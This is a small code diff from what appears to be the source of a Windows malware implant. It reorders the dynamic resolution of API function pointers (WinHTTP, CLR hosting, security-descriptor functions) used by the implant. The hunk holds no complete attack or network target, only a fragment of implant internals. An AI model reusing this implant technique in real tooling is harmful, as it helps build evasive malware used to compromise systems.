@@ -70,6 +70,7 @@ namespace Implant {
         }
 
         if (
+            !(FPTR(Ctx->CLR.CLRCreateInstance,              Ctx->Modules.mscoree, CLRCREATEINSTANCE)) ||
             !(FPTR(Ctx->win32.WinHttpOpen,                  Ctx->Modules.winhttp, WINHTTPOPEN)) ||
             !(FPTR(Ctx->win32.WinHttpConnect,               Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
             !(FPTR(Ctx->win32.WinHttpOpenRequest,           Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
@@ -96,7 +97,6 @@ namespace Implant {
             !(FPTR(Ctx->win32.InitializeAcl,                Ctx->Modules.advapi, INITIALIZEACL)) ||
             !(FPTR(Ctx->win32.SetSecurityDescriptorDacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
             !(FPTR(Ctx->win32.SetSecurityDescriptorSacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
-            !(FPTR(Ctx->CLR.CLRCreateInstance,              Ctx->Modules.mscoree, CLRCREATEINSTANCE)) ||
             !(FPTR(Ctx->win32.FreeSid,                      Ctx->Modules.advapi, FREESID))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
